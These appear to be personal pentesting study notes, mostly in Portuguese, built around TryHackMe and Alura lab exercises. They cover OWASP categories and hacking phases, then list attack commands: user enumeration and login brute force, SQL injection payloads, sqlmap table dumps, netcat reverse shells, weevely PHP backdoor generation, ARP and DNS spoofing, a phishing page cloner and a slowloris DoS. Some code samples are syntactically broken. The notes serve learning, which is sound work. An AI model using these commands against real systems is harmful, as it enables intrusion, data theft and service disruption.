
```
$ sudo umount '/tmp/.X11-unix'
$ sudo rm -rf /tmp/.X11-unix
& ffuf -w <Wordlist> -u http://<URL>/FUZZ
& dirb https://<URL>/ <Wordlist>
& gobuster dir --url https://<URL>/ -w <Wordlist>
& dnsrecon -t brt -d <url> || dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
& ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.<host>" -u <url>
Find out valid users
& ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<domain>/signup -mr "username already exists"
Brute Force
& ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://<domain>/login -fc 200


nslookup -type=A tryhackme.com 1.1.1.1
nslookup -type=MX tryhackme.com 1.1.1.1
nslookup -type=TXT tryhackme.com 1.1.1.1
whois tryhackme.com
dig tryhackme.com A
dig @1.1.1.1 tryhackme.com MX

```


White Hats -> Hackers Éticos
Black Hats -> Hackers Maliciosos
Grey Hats  -> Burlam sistemas e são especialistas de sites, entretanto, com intenções questionáveis

Legislação Brasileira de Crimes Cibernéticos
Lei 12.737 - 30 Novembro de 2012 (Lei Carolina Dieckmann)
Lei 12.965 - 23 de Abril de 2014 (Marco Civil da Internet)
Lei 13.709 - 14 de Agosto de 2018 (LGPD - Lei Geral de Proteção de Dados)

## Red Team
Equipe formada por profissionais de segurança ofensiva que desenvolve atividades focadas em simular ataques e invasões. Sendo assim, o grupo atua como “hackers éticos”. Para isso, inicialmente, o time realiza uma varredura da aplicação para adquirir o máximo de informações possíveis. Com isso, é possível redigir um diagnóstico que demonstra quais são as principais falhas e riscos. Em seguida, se iniciam os testes de segurança, e são exploradas todas as possíveis falhas na proteção; ou seja, eles agem como se fossem usuários maliciosos. Feito isso, o time redige um relatório dos testes feitos e sugere alguns pontos que podem melhorar a segurança digital da empresa.

## Blue Team
Time focado em segurança defensiva, ou seja, é responsável por atuar na defesa contra uma invasão. Então, caso uma aplicação sofra uma tentativa de invasão, o time azul entra em ação com o foco de impedir que essa ação tenha sucesso. Além disso, esses profissionais também têm como responsabilidade criar táticas com o objetivo de diminuir os impactos e prejuízos caso a empresa sofra problemas com a segurança.

## Purple Team
É importante mencionar que existem organizações que também estão adotando o purple team que é uma equipe que tem como objetivo garantir a sinergia e a colaboração entre o blue team e o red team.

## Sistemas Operacionais com Ferramentas para o Pentest

- BlackArch baseada no Arch Linux
- BackBox baseada no Ubuntu
- WHAX baseada no Slackware
- Pentoo baseado no Gentoo
- Kali Linux baseada no Debian

## Owasp Top10 2021
1) [[Broken Access Control]]: também pode ser conhecido como vulnerabilidade de controle de acesso e se caracteriza por exposição de informações confidenciais para algum usuário não autorizado ou falsificação de requisições.
2) [[Cryptographic Failures]]: também conhecido por falhas em criptografias, esse risco se refere à vulnerabilidade nas criptografias ou na falta delas, o que pode levar a uma exposição de dados sensíveis.
3) [[Injection]]: injeção? isso mesmo! É uma vulnerabilidade caracterizada como injeção de scripts ou comandos em aplicações web, como por exemplo o famoso [[sql injection]].
4) [[Insecure Design]]: está relacionado a falhas de design e arquitetura, como por exemplo, mensagem de erro contendo informações confidenciais.
5) [[Security Misconfiguration]]: vulnerabilidade nas configurações de segurança, como por exemplo permissões de serviços em nuvem configuradas de forma incorreta.
6) [[Vulnerable and Outdated Components]]: caracterizado pela utilização de ferramentas desatualizadas ou que não possuem suporte.
7) [[Identification and Authentication Failures]]: falhas de identificação ou autenticação, como por exemplo aquelas que permitem alguns ataques como o de força bruta, que é caracterizado por diversas tentativas, ou que aceita senhas fracas.
8) [[Software and Data Integrity Failures]]: falhas de integridade de software e dados que podem estar relacionadas a pipelines de Integração e Entrega Contínua (CI/CD) e atualizações de softwares.
9) [[Security Logging and Monitoring Failures]]: falhas de registro e monitoramento de segurança que podem ser a falta de criação ou análise de relatórios sobre os ataques de segurança detectados durante testes de intrusão.
10) [[Server-Side Request Forgery]]: pode ser traduzido como falsificação de solicitação por parte do servidor, também conhecido pela sigla SSRF, que ocorre quando uma aplicação web está buscando um recurso remoto sem validar a URL fornecida pelo usuário.
## Fases do Hacking
1) Reconhecimento
   - Coletar o máximo de informações possível (HTTrack, Maltego etc)
2) Varredura
   - Encontrar maneiras fáceis e rápidas de acessar a rede e procurar informações ( #Nessus, #Nmap, #Nikto, #Wapiti, #OpenVas)
3) Obter Acesso
   - Quem invade usa todos os meios para obter acesso não autorizado aos sistemas, aplicativos ou redes do alvo ( #Metasploit)
4) Manter Acesso
   - Quem invade tenta seu melhor para manter esse acesso e explora continuamente o sistema ( #Backdoor, #Trojan)
5) Limpeza
   - O invasor limpa seu rastro a fim de não ser pego. Assim, essa etapa garante que os invasores não deixem pistas ou evidências que possam ser rastreadas.
## Tipos de Pentest
- Blind: Auditor não sabe nada sobre o alvo
- Double Blind: Auditor não sabe nada sobre o alvo e o alvo não sabe que será atacado
- Gray Box: Auditor sabe de forma parcial coisas sobre o alvo e a vitima sabe que será atacado (sabe quais testes poderão ser feitos)
- Double Gray Box: Auditor sabe de forma parcial coisas sobre o alvo e a vitima sabe que será atacado (não sabe quais testes serão feitos)
- Tandem: Auditor sabe muito sobre o alvo e o alvo sabe que será atacado
- Reversal: Auditor sabe de tudo sobre o alvo e o alvo não sabe de nada (nem que será atacado)
## Coleta de Informações]

Foot-printing: Nomes, Domínios, E-mails, Documentos, Redes Sociais, Parentesco, Telefones, Endereços, Fotos, Mapa, Empresas, Operadoras
Fingerprinting: IPs, Servidores, Dispositivos, Topologia, Sistemas Operacionais, Serviços, Aplicações, Erros, Vulnerabilidades, Pontos de Entrada, Usuários

Google Hacking: 
https://pt.wikipedia.org/wiki/Google_Hacking

Na barra de busca do google podemos retirar palavras que não queremos que seja buscada: ex: vivo -telefone -plano

| Filter   | Example            | Description                                                  |
| -------- | ------------------ | ------------------------------------------------------------ |
| site     | site:tryhackme.com | returns results only from the specified website address      |
| inurl    | inurl:admin        | returns results that have the specified word in the URL      |
| filetype | filetype:pdf       | returns results which are a particular file extension        |
| intitle  | intitle:admin      | returns results that contain the specified word in the title |
Unlike the [robots.txt] file, which restricts what search engine crawlers can look at, the [sitemap.xml] file gives a list of every file the website owner wishes to be listed on a search engine.

Digitar os comandos acima fará com que o google lhe peça confirmação por captcha, para fugir disso caso queira fazer uma automação, você pode usar a API do Google

#WAF ( Web Application Firewall):
    Um firewall de aplicativos Web filtra, monitora e bloqueia o tráfego HTTP de e para um aplicativo ou site da Web. Um WAF é diferenciado de um firewall comum em que um WAF é capaz de filtrar o conteúdo de aplicativos web específicos, enquanto os firewalls comuns servem como um portão de segurança entre servidores.
    https://docs.nginx.com/nginx-waf/
    https://www.tecmint.com/install-modsecurity-nginx-debian-ubuntu/

#SIEM (Gerenciamento e Correlação de Eventos de Segurança):
	A tecnologia SIEM coleta dados de log de eventos de várias fontes, identifica atividades que se desviam da norma com análise em tempo real e toma as medidas apropriadas.
     ! O Graylog é uma importante solução de gestão de registros centralizados para capturar, armazenar e permitir a análise de petabytes de dados de máquina.

#IDS / #IPS (Intrusion Detection System)/(Intrusion Prevention System), traduzindo, significam Sistema de Detecção de Intrusão e Sistema de Prevenção de Intrusão respectivamente.:
      São recursos que examinam o tráfego na rede, para detectar e prevenir os acessos não autorizados na mesma, protegendo-a da exploração das vulnerabilidades.
      !Snort no pfsense

# Tecnologias de Pentest

#Nmap:

Nmap é um software livre que realiza port scan desenvolvido pelo Gordon Lyon, autoproclamado hacker "Fyodor". É muito utilizado para avaliar a segurança dos computadores, e para descobrir serviços ou servidores em uma rede de computadores.

1. When a _privileged_ user tries to scan targets on a local network (Ethernet), Nmap uses _ARP requests_. A privileged user is `root` or a user who belongs to `sudoers` and can run `sudo`.
2. When a _privileged_ user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
3. When an _unprivileged_ user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.
```bash
$ nmap -A [IP do servidor]
$ nmap -A -T4 -Pn 192.168.0.8  # Exibe todas as portas e quais processos elas estão rodando
$ nmap -n -p 80 --open 192.168.15.0/24 # verifica todas as conexões abertas na porta 80 no range da minha rede, assim descobrimos o IP da máquina, depois basta colocar esse ip no navegador
```

| Scan Type              | Example Command                             |
| ---------------------- | ------------------------------------------- |
| ARP Scan               | `sudo nmap -PR -sn MACHINE_IP/24`           |
| ICMP Echo Scan         | `sudo nmap -PE -sn MACHINE_IP/24`           |
| ICMP Timestamp Scan    | `sudo nmap -PP -sn MACHINE_IP/24`           |
| ICMP Address Mask Scan | `sudo nmap -PM -sn MACHINE_IP/24`           |
| TCP SYN Ping Scan      | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30`  |
| TCP ACK Ping Scan      | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`  |
| UDP Ping Scan          | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30` |

|Option|Purpose|
|---|---|
|`-n`|no DNS lookup|
|`-R`|reverse-DNS lookup for all hosts|
|`-sn`|host discovery only|

Ver: https://nmap.org/docs.html

#Wapiti:
	O Wapiti é principalmente usado para realizar testes “black-box”, que é um método que examina os recursos de uma aplicação sem verificar as estruturas internas. 
```bash
$ wapiti -u <URL>
```

#Wappalyzer:
	O Wappalyzer é uma ferramenta de código aberto disponível no GitHub e 100% gratuita que foi criada em 2009 e tem como objetivo identificar as tecnologias usadas em um site.

#Cookie_Manager:
	Com ela conseguimos visualizar, editar, excluir e pesquisar cookies e notamos que isso possibilita fazer até mesmo um ataque.

#Metasploit:
	O Projeto Metasploit é um projeto de segurança de computadores que fornece informações sobre vulnerabilidades de segurança e ajuda em testes de penetração e desenvolvimento de assinaturas IDS. É propriedade da Rapid7, empresa de segurança sediada em Boston, Massachusetts.
```bash
$ use auxiliary #mostra os exploits que podem ser usado
$ use auxiliary/scanner/http/joomla_version  # Usado na VM OWA na aplicação joomla
> show options  # Informa que parâmetros devemos informar.  
> set RHOSTS 192.168.0.97  # RHOSTS é o host, no caso, o IP do OWASP BWA. Para defini-lo, vamos rodar o comando set RHOSTS seguido do IP informado pelo servidor (sem o http://). No meu caso, comando será set RHOSTS 192.168.100.167.
> set TARGETURI /joomla  # Em TARGETURI, indicaremos a pasta do Joomla, com o comando set TARGETURI /joomla. Podemos manter a configuração atual de PORT e SSL. Quanto a THREADS (quantidade de comandos por segundo). 
> run | exploit  # Por fim, basta executar run para rodar o escaneamento. Como resposta, vamos obter diversos dados importantes para essa etapa inicial de testes de intrusão. Verificamos ser um Ubuntu rodando no Apache e que a versão do Joomla é 1.5.15, por exemplo.
> back
***********
$ use auxiliary/scanner/http/brute_dirs # Executa um teste de força bruta e retorna com status 200 diretórios que forem encontrados em um site
> set RHOSTS 192.168.100.157  # Para RHOSTS, preencha com o endereço IP do seu servidor OWASP BWA
> set PATH /bWAPP  # Em PATH, vamos inserir o diretório da nossa aplicação bWAPP
> run | exploit
> back
#RHOST = Remote Host | LHOST => Localhost
***********
$ use <exploit>  # ex:  exploit/unix/ftp/vsftpd_234_backdoor
$ search <tag>   # ex: search http
***********
$ load wmap      # Metasploit conta com um plugin chamado WMAP que faz uma varredura de possíveis vulnerabilidades da nossa aplicação e lista as ferramentas que podemos usar (e, inclusive, possibilita a execução de todas elas de uma vez só). Para carregar esse plugin, vamos rodar o comando load wmap
$ wmap_sites -a http://192.168.100.157 # informar a localização do nosso servidor, onde o WMAP fará a varredura. No caso, será o IP do servidor com a flag -a para indicar a URL
$ wmap_targets -t http://192.167.100.167/bWAPP/  # Após pressionar "Enter", seremos informados de que o site foi criado. Em seguida, indicaremos a página da aplicação (target uri) em que vamos realizar a busca. No caso, será a bWAP
$ wmap_run -t   # Com o target definido, vamos rodar o comando wmap_run seguido da flag -t, para que o WMAP encontre vulnerabilidades e liste os módulos que podemos usar no Metasploit
$ wmap_run -e   # Para rodar todos esses módulos
```
https://www.guiadoti.com/2018/04/metasploit-framework-parte-1/
https://www.guiadoti.com/2018/05/metasploit-framework-de-cabo-a-rabo-parte-2/

#Nessus:
	Nessus Cloud é um programa de verificação de falhas/vulnerabilidades de segurança. Ele é composto por um cliente e servidor, sendo que o scan propriamente dito é feito pelo servidor.

#Nikto:
	Nikto é um scanner de vulnerabilidades de software livre acessado por CLI, usado para escanear servidores web em busca de arquivos perigosos, programas desatualizados e outros problemas. É capaz de fazer tanto análises genéricas como análises específicas de servidor. Também faz a captura e exibição de cookies HTTP. 
	! Existem ferramentas como o Nikto que são capazes de “scanear” um servidor web, listando informações de servidor, como qual tecnologia utilizada, versão, etc e os links referentes a um domínio. Com isso, podemos descobrir páginas que teoricamente não eram para ser indexadas, e se tiver alguma página com conteúdo privado que não esteja com nenhum processo de autenticação, qualquer usuário poderá acessar.
```bash
$ nikto -h "http://192.168.1.37/multillidae/" # exemplo
```

#Software_Weevely:
	O WEEVELY é uma ferramenta desenvolvida em Python que permite que um Backdoor seja gerado no formato .php e se executado em um host remoto pode obter o console do sistema.
```bash
$ weevely generate 1234 aplicacao.php # Generated backdoor with password '1234' in 'aplicacao.php' of 1429 byte size
$ weevely "http://192.168.1.42/dvwa/hackable/uploads/aplicacao.php" 1234 # Caso aja conexeção significa que o backdor conseguiu acesso ao servidor
```

#Owasp-zap:        ****warning*** -> não pode ser usado em sites da internet
	Traduzido do inglês-OWASP ZAP é um scanner de segurança de aplicativos da web de código aberto. Ele deve ser usado tanto por aqueles que são novos em segurança de aplicativos quanto por testadores de penetração profissionais. É um dos projetos mais ativos do Open Web Application Security Project e recebeu o status de carro-chefe.

#Sqlmap: 
	Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites. 
	!Threads no sqlmap se refere a quantidade de requisições que ele faz em um instante de tempo, quanto maior o número passado mais poder computacional será exigido, pode ser definido por --threads \[1-10\]
	! --crawl=2 caso você informe alguma url sem nenhum parametros - ao invés de "\<url\>/category=", você informa "\<url\>" - o método crawl irá fazer a busca pelos parâmetros ele encontrar na página  
	! Para melhorar a performance informe a base de dados usada (se a caso já souber) com --dbms PostgreSQL, o sistema operacional usado com --os, --batch para o sqlmap não ficar fazendo perguntas na tela.

```bash
$ sqlmap -u "URL_DO_FORMS"   # Testa várias injeções e retorna se encontrou alguma vunerabilidade
   $ sqlmap -u "URL_DO_FORMS" --dbs  # Lista os banco de dados do site.
   $ sqlmap -u "URL_DO_FORMS" --current-db  # retorna o banco de dados usado
   $ sqlmap -u "URL_DO_FORMS" --tables -D nowasp  # Uma vez que descobrimos qual o banco, podemos obter o número de tabelas que ele possui e o nome delas
   $ sqlmap -u "URL_DO_FORMS" --dump -T credit_cards -D nowasp # Vai tentar retornar o conteúdo da tabela informada
   $ sqlmap -u <url> –D <db_name> –tables <table> –columns “password,username” –dump  # mostra as informações das colunas que eu informar 
   $ sqlmap -u "URL" --data="email=alex@gmail.com&senha=123" # A opção --data é utilizada para passar os parâmetros enviados pela requisição POST, através desses parâmetros o sqlmap irá tentar fazer a injeção de código SQL
   $ sqlmap -u "URL_DO_FORMS" --batch # Executa o sqlmap sem que ele faça perguntas no terminal, irá retornar apenas algumas respostas padrão
   $ sqlmap -u <url> --technique TU  # Caso eu queria explorar Sql Injection baseado em tempo e no comando UNION
   $ sqlmap -u "URL" --batch --dbms mysql --os linux --threads 3 -D mutillidae -T accounts -C "username,password,is_admin" --dump  # Estamos passando uma url com parâmetro para o sqlmap a fim de baixar os dados da base de dados mutillidae, tabela accounts e colunas username, password e is_admin para visualizar os dados de usuários, senhas e administrador. Além disso, ela melhorou a performance do comando ao utilizar comandos que informam o gerenciador de base dados, o sistema operacional utilizado no servidor e a quantidade de requisições.
```

https://portswigger.net/web-security/sql-injection/cheat-sheet
https://www.codigofonte.com.br/artigos/a-historia-do-sql-injection
https://www.alura.com.br/artigos/sql-injection-proteja-sua-aplicacao

#Netcat:
```bash
$ nc.exe -nlvp 4444 -e cmd.exe  # Create a reverse shell with Ncat using cmd.exe on Windows nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe
$ nc -nv $ip_victim 4444 -e /bin/bash # Create a reverse shell with Ncat using bash on Linux
 nc -lvp 4444 (victim) 
$ nc -lvp 9000 # Listening a TCP/IP connection, -l of listening, -v verbose and -p of port.
 nc 127.0.0.1 9000             # To connect to the port that is listening 
$ nc -nv $ip 4444 < file        # Send a file using netcat
$ nc -nlvp 4444 > incoming.exe  # Receive a file using netcat
$ nc -zv <ip> 1-90              # Nc will scan port 1 until 90 
```

#Wireshark: 
	https://www.wireshark.org/  - Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the de facto (and often de jure) standard across many commercial and non-profit enterprises, government agencies, and educational institutions. Wireshark development thrives thanks to the volunteer contributions of networking experts around the globe and is the continuation of a project started by Gerald Combs in 1998.
       `*ip.addr==algum_ip   => para filtrar no wireshark`
       #SYN => Synchronization
       #ACK => Acknowledgement. ACK means that the machine sending the packet with ACK is acknowledging data that it had received from the other machine. 
       #PSH => PSH is an indication by the sender that, if the receiving machine's TCP implementation has not yet provided the data it's received to the code that's reading the data (program, or library used by a program), it should do so at that point. 
       
#Hydra: 
      Software de Bruit Force
      !Em um lab da Alura, temos o username "cake" e a password "123456" que informamos. Além disso, há um anticsrftoken. Ou seja, a cada requisição, será recebido um token utilizado contra ataques de CSRF. Dessa forma, cada usuário tem seu próprio token, evitando que outras pessoas façam a requisição por ele (como é feito no CSRF). O Hydra faz diversas requisições com username e password e pode ser que ele esteja usando o mesmo token para todas elas, por isso o ataque não funciona mais. Como o Burp é capaz informar um token diferente para cada requisição e fazer a força bruta, vamos utilizá-lo em vez do Hydra, para tentar entrar no sistema.
      
#Tesseract:
	O Tesseract é uma IA utilizada para reconhecer caracteres a partir de um arquivo de imagem. Pode ser utilizada para descobrir o texto de captchas de imagens. 
	https://github.com/tesseract-ocr/tesseract

## Tipos de Ataques

#Man_In_the_Middle (MITM):
      * O ataque Man In The Middle consiste em explorar a forma sem estado (stateless) na qual o protocolo ARP trabalha. Dessa forma, um Hacker pode usar de ferramentas para enviar respostas desse protocolo com o intuito de manipular a tabela ARP de suas vítimas para ficar assim no meio da comunicação e visualizar o que é trafegado entre os dispositivos manipulados.
        $ apt-get-install mitmf  => no kali linux
        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]    => ex: mitm --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
        $ arp - a           => no pc da vítima antes e depois do ataque, veremos que o endereço MAC foi alterado
#Command_injection Injeção de comando
           Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.
```php
// The $title is injectable
<?php
$songs "/var/www/html/songs"

if (isset $_GET["title"])) {
	$title = $_GET["title"];
	
	$command "grep $title /var/www/html/songtitle.txt";
	
	$search = exec($command);
	if ($search == "") {
		&return = "<p>The requested song</p><p> $title does </p><b>not</b><p>exist!</p>";
	} else {
		$return = "<p>The requested song</p><p> $title does </p><b>exist!</b>";
	}

	echo $return;
?>
```
```python
# 1. We use a route in the webserver that will execute whatever is provided. For example, to execute `whoami`, we'd need to visit http://flaskapp.com/whoami
import subprocess
From flask import Flask

app = Flask(__name___)
def execute_command(shell):
	return subprocess.Popen(shell, shell=True,stdout=subprocess.PIPE).stdout.read()

@app.route('/<shell>')
def command_server(shell):
	return execute_command(shell)
```
```php
// Protecting our program against command injection
<input type="text" id="ping" name="ping" pattern="[0-9]+"></input>  

<?php
	echo passthru("/bin/ping -c 4 "$_GET["ping"]');
?>
```
```php

// Protecting our program against command injection
<?php
	if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {
}
?>

// Bypassing filters anti Command Injection
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```
#DNS_Spoofing:
      * O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
      * A ferramenta setoolkit é capaz de mandar emails para vítimas com nomes de outras pessoas. Dessa forma, ao passarmos um link com nome de outra pessoa, um usuário comum se tornará vulnerável ao ataque, uma vez que a mensagem parece ter sido enviada por um usuário confiável. No arquivo harvester que está no diretório /var/www/html deveremos ver o usuário e senha que digitamos.
```bash
$ git clone https://gitbub.com/trustedsec/social-engineer-toolkit.git  => no kali linux, baixamos uma ferramenta capaz de clonar páginas da web.
$ cd social-engineer-toolkit/
$ ./setoolkit
yes
set>1
set>2
set:webattack>3
/var/www/html  => site clonado estará aqui
$ cd /etc/mitmf
$ getit mitmd.conf
$ *.alura.com.br=192.168.121.172  => redirecionar o site da alura para aquele ip que contem a página clonada
$ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface] --dns   => ex: mitmf --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0 --dns
Ver: https://anonymousemail.me/]
* Quando forçamos o redirecionamento para uma página de nosso controle, mesmo que um usuário mal intencionado tente mudar o redirecionamento, ele não terá sucesso. Podemos, por exemplo colocar em nossa programação, algo como:
$ response.sendRedirect("http://www.meusite.com.br");
Ao invés de:
$ response.sendRedirect(request.getParameter("url"));
! Existem casos que por questão estratégica e de otimização, não queremos que certas páginas sejam indexadas em mecanismos de buscas. Dessa forma, precisamos informar a esses mecanismos de busca quais são as páginas de nosso site que não queremos que seja indexada e isso é feito através do arquivo robots.txt. Portanto, o robots.txt seria um arquivo no qual informamos como os mecanismos de busca devem indexar as páginas de nosso site. 
```

#DoS ( #Denial_of_Service):
      * Um ataque de negação de serviço ou em inglês Denial Of Service (DoS) ocorre quando temos um usuário que utiliza de recursos para causar uma sobrecarga em um sistema com o principal objetivo de torná-lo indisponível para outros usuários.
      * Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.
      * O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.
      * O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.
```bash
$ git clone https://github.com/llaera/slowloris.pl.git  => no kali linux, baixamos uma ferramenta capaz de sobrecarregar um servidor
$ cd slowloris.pl/
$ chmod +x slowloris.pl
$ ./slowloris.pl
$ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
```
#DDoS ( #Distributed_Denial_of_Service):
      * O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.
      * Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).
  #SQL_Injection:
      * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
      * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.

https://wanderication.medium.com/tryhackme-sql-injection-a261106cf392
https://medium.com/@Aircon/sql-injection-tryhackme-thm-f712548fc198

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

' OR 1=1;--

admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--


admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
Ver: https://portswigger.net/web-security/sql-injection/cheat-sheet
     https://portswigger.net/web-security/sql-injection/union-attacks
     https://portswigger.net/web-security/sql-injection/examining-the-database
      *Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
        == Tipos de ataques SQL Injection com Sqlmap =====
        => Error based injection - Injeção baseada em erro
           Essa técnica é conhecida por forçar o banco de dados a gerar mensagens de erro para que, por meio disso, possamos obter informações.
           Seu parâmetro no sqlmap: E
        => Time-based - Baseada no tempo
           É um tipo de técnica classificada como “Blind Query”, que significa que o usuário faz a consulta sem ver informações ou erros do banco de dados na página da aplicação. Nesse caso, ele apenas analisa o tempo de resposta do banco para fazer o ataque. Ou seja, o ataque depende de um tempo especificado para o banco de dados retornar resultados, indicando se a execução foi bem-sucedida ou não na consulta SQL.
           Seu parâmetro no sqlmap: T
        => Stacked queries - Consultas empilhadas
           Injeção que é capaz de modificar dados além de encerrar uma consulta atual, adicionando uma nova.
           Seu parâmetro no sqlmap: S
        => Boolean based injection - injeção baseada em booleano
           Também é uma técnica do tipo injeção cega, em que o usuário usa condições booleanas para verificar se são verdadeiras ou falsas e, com isso, obter informações do banco de dados.
           Seu parâmetro no sqlmap: B
        => Union-query based - Baseada no UNION
           Situação vista na aula anterior, em que é possível unir dois SELECTs que possibilitam fazer duas consultas.
           Seu parâmetro no sqlmap: U 
      * Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
        $ String usuario=request.getParameter("usuario");
        $ String senha=request.getParameter("senha");
        ! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
        $ String sql = "Insert into accounts (username.password) values (?,?)";
        ! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
        $ PreparedStatement stmt = connection.prepareStatement(sql);
        ! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
        $ stmt.setString(1,usuario);
        $ stmt.setString(2,senha);
        $ stmt.execute();
        https://portswigger.net/web-security/sql-injection/cheat-sheet

#Brut_force_attack:
     * Burp Suite é um software desenvolvido em Java pela PortSwigger, para a realização de testes de segurança em aplicações web. O Burp Suite é dividido em diversos componentes.
```bash
$ locate /wordlists                 => listas de palavras mais comuns utilizadas em senhas e nicknames (já vem por padrão no Kali Linux) 
$ cewl "<URL>" -d <Nº DE PÁGINAS>   => Faz uma busca em um site e cria uma lista de palavras chaves com base nele
$ cewl "http://192.168.1.37/multilidae/" -d 1 -w cewl.txt => colocar a saída em arquivo txt que pode ser carregada no burp suite
! Uma das formas mais usadas contra esse tipo de ataque seria obrigar o usuário a cadastrar senhas com um formato mais complexo (ex: uso de letras maiúsculas e minúsculas, caracteres especiais, tamanho mínimo, etc), bem como limitar o número de tentativas de acesso por um mesmo usuário. Desta forma, evitamos que um usuário mal intencionado, utilize de listas pré-existentes para se logar no sistema.
* Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.        
